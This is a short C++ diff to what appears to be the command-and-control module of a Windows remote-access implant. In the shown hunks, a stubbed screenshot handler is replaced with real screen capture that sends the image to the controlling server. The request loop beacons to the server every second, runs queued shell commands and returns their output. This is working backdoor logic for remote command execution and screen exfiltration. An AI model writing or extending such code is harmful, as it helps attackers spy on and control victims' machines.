@@ -211,9 +211,10 @@ void cncManager::responseParser(UCHAR* res, DWORD len) {
             {
                 this->printParsedResponse(resData, "FTP_REQUEST");
                 if (!data.compare("screenshot")) {
-                    //commandManager cmd;
-                    //cmd.getScreen();
-                    this->sendData(ftpResponse, 10, (LPVOID)"abcdeabcde");
+                    commandManager cmd;
+                    LPVOID ptr = cmd.getScreen();
+                    this->sendData(ftpResponse, cmd.data_len, ptr);
+                    delete[] ptr;
                 }
                 break;
 
@@ -249,10 +250,10 @@ void cncManager::printParsedResponse(DDprotocol* resData,std::string type) {
     std::cout << "===============" << std::endl;
 }
 
-void cncManager:: handleShellRequest(commandManager& commander) {
+void cncManager::handleRequest() {
+    commandManager commander;
     std::string result;
     while (TRUE) {
-        /* For DEBUG */
         this->sendData(beaconRequest, BEACON_DATA_LEN, BEACON_DATA);
 
         while (!this->shellCmd.empty()) {
@@ -262,6 +263,7 @@ void cncManager:: handleShellRequest(commandManager& commander) {
             this->sendData(shellResponse, result.size(), (LPVOID)result.c_str());
             this->shellCmd.pop_front();
         }
-            Sleep(1000);
+        /* For DEBUG */
+        Sleep(1000);
     }
 }
